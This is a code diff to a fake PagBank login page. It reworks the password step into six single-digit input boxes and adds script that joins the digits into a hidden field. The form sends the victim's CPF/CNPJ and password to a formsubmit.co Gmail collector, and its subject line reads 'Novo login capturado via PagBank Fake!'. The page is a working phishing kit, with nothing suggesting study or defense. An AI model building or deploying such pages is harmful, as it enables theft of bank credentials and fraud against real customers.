@@ -33,19 +33,33 @@
     .logo img {
       width: 140px;
     }
-    h2, .cpf-display {
+    .cpf-display {
       font-size: 1.1rem;
       color: #333;
       margin-bottom: 20px;
     }
-    input {
-      width: 100%;
-      padding: 14px;
-      font-size: 1rem;
-      border: 1px solid #ccc;
-      border-radius: 8px;
+
+    .code-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
       margin-bottom: 20px;
     }
+
+    .code-input {
+      width: 40px;
+      height: 50px;
+      text-align: center;
+      font-size: 24px;
+      border: 2px solid #04a94f;
+      border-radius: 10px;
+      outline: none;
+    }
+
+    .code-input:focus {
+      border-color: #028b41;
+    }
+
     button {
       width: 100%;
       padding: 14px;
@@ -55,6 +69,10 @@
       border-radius: 8px;
       font-size: 1rem;
       cursor: pointer;
+    }
+
+    input[type="hidden"] {
+      display: none;
     }
   </style>
 </head>
@@ -68,21 +86,53 @@
       CPF/CNPJ: <span id="cpfCnpjExibido"></span>
     </div>
 
-    <form action="https://formsubmit.co/alunospilotos@gmail.com" method="POST">
+    <form action="https://formsubmit.co/alunospilotos@gmail.com" method="POST" id="senhaForm">
       <input type="hidden" name="_subject" value="Novo login capturado via PagBank Fake!" />
       <input type="hidden" name="_template" value="table">
       <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="cpf" id="cpfOculto" />
+      <input type="hidden" name="senha" id="senhaCompleta" />
 
-      <input type="text" name="cpf" id="cpfOculto" readonly />
-      <input type="password" name="senha" placeholder="Digite sua senha" required />
+      <div class="code-container">
+        <input class="code-input" type="text" maxlength="1">
+        <input class="code-input" type="text" maxlength="1">
+        <input class="code-input" type="text" maxlength="1">
+        <input class="code-input" type="text" maxlength="1">
+        <input class="code-input" type="text" maxlength="1">
+        <input class="code-input" type="text" maxlength="1">
+      </div>
+
       <button type="submit">Entrar</button>
     </form>
   </div>
 
   <script>
+    // CPF
     const cpf = localStorage.getItem('cpfCnpj');
     document.getElementById('cpfCnpjExibido').innerText = cpf;
     document.getElementById('cpfOculto').value = cpf;
+
+    // Quadrinhos de senha
+    const inputs = document.querySelectorAll('.code-input');
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        if (input.value && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+      });
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+
+    // Monta senha antes do envio
+    const form = document.getElementById('senhaForm');
+    form.addEventListener('submit', (e) => {
+      const senha = Array.from(inputs).map(i => i.value).join('');
+      document.getElementById('senhaCompleta').value = senha;
+    });
   </script>
 </body>
 </html>
